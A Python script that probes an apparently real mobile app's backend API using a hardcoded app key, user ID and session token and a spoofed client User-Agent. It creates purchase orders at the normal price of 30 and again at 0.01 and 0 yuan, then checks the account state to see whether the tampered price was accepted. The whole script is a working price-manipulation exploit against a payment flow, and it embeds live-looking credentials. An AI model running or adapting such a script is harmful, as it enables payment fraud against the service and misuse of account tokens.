# -*- coding: utf-8 -*-
import json, re, urllib.request, urllib.parse, time

BASE = "https://heootjfch5.842644.xyz"
KEY  = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
API  = BASE + "/appapi"
UID  = "94970"
TOK  = "eyJ1aWQiOjk0OTcwLCJpYXQiOjE3OTUzNjg2MjAsImV4cCI6MTc5Nzk2MDYyMCwibm9uY2UiOiJiNTQ5YzY4ZDQ3OTA3Y2M5IiwidiI6MX0.9373ed25bfd0883595f85ab8db9ee773ebf6f4a8540b582baf0d3d02732fe3bc"

def call(name, method="GET", data=None, extra="", tok=True):
    url = API + "/" + name + "/appkey/" + KEY + extra
    hdr = {"User-Agent": "okhttp/3.12.0", "Content-Type": "application/x-www-form-urlencoded"}
    if tok: hdr["token"] = TOK
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    r = urllib.request.Request(url, data=body, headers=hdr, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "EXC %s" % e

def p(tag, st, body, n=700):
    print("[%s] %s\n   %s\n" % (tag, st, body[:n].replace("\n", " ")))

# 1. 支付档位
st, b = call("getPayList", "GET")
p("getPayList", st, b, 2000)

# 2. 订单（原价）
st, b = call("createOrder", "POST", {"userId": UID, "payId": 1, "buyType": 2, "payCode": "alipay", "price": 30, "gold": 0, "packId": 0})
p("order-normal", st, b)

# 3. 订单（0.01 元）
st, b = call("createOrder", "POST", {"userId": UID, "payId": 1, "buyType": 2, "payCode": "alipay", "price": 0.01, "gold": 0, "packId": 0})
p("order-0.01", st, b)

# 4. 订单（0 元）
st, b = call("createOrder", "POST", {"userId": UID, "payId": 1, "buyType": 2, "payCode": "alipay", "price": 0, "gold": 0, "packId": 0})
p("order-0", st, b)

# 5. 状态
st, b = call("getUserInfo", "GET", extra="/userId/" + UID)
p("userInfo", st, b, 500)
